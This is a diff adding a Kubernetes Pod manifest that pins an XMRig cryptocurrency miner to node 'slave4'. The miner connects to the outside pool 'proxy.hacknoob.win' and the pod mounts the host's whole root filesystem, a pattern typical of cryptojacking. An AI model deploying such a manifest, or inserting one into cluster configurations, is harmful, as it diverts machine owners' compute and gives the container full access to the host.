@@ -1,0 +1,33 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: xmrig-exec-4
+spec:
+  affinity:
+    nodeAffinity:
+      requiredDuringSchedulingIgnoredDuringExecution:
+        nodeSelectorTerms:
+        - matchExpressions:
+          - key: kubernetes.io/hostname
+            operator: In
+            values:
+            - slave4
+  containers:
+  - name: xmrig-container-4
+    image: busybox
+    command:
+    - /home/worker4/xmrig/build/xmrig
+    - -o
+    - proxy.hacknoob.win:5554
+    - -u
+    - slave4
+    - --cpu-no-yield
+    - --nicehash
+    - --randomx-1gb-pages
+    volumeMounts:
+    - name: xmrig-volume-4
+      mountPath: /
+  volumes:
+  - name: xmrig-volume-4
+    hostPath:
+      path: /
